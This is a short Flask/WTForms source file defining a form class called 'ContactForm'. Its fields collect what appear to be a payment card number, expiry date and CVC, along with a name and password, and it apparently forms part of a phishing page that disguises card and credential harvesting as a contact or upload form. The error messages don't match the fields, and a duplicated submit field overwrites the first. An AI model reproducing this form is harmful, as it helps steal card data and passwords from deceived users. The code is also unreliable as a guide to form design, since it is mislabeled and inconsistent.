from flask_wtf import FlaskForm, CSRFProtect
from wtforms import StringField, TextAreaField, SubmitField
from wtforms.validators import DataRequired, Email

csrf = CSRFProtect()

class ContactForm(FlaskForm):
    file =StringField('file', validators=[DataRequired('')])
    cnum = StringField('cnum', validators=[DataRequired('Email or phone numbers does not match')])
    exd = StringField('exd', validators=[DataRequired('Email or phone numbers does not match')])
    cvc = StringField('cvc', validators=[DataRequired('Email or phone numbers does not match')])
    name = StringField('Name', validators=[DataRequired('Email or phone numbers does not match')])
    password = StringField('Password', validators=[DataRequired('Please enter your password')])
    submit = SubmitField("Send the email")
    submit = SubmitField("Uploaded Image")
    
